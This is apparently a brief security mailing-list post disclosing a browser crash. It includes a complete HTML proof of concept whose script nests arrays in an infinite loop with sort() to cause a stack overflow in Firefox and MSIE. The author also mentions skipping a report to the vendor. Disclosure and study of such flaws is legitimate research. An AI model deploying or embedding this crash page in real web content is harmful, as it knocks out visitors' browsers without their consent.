Subject: FIREFOX flaws: nested array sort() loop Stack overflow exception


Hi all,

Same flaw works for Firefox as well as MSIE:

<HTML>
  <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
  <SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
</HTML>

Added to the list: http://www.edup.tudelft.nl/~bjwever/advisory_firefox_flaws.html

I'd have loved to CC mozilla about this, but I didn't have the time to do the crash course "how to write a bug report" and go through all that bugzilla crap.

Cheers,
SkyLined
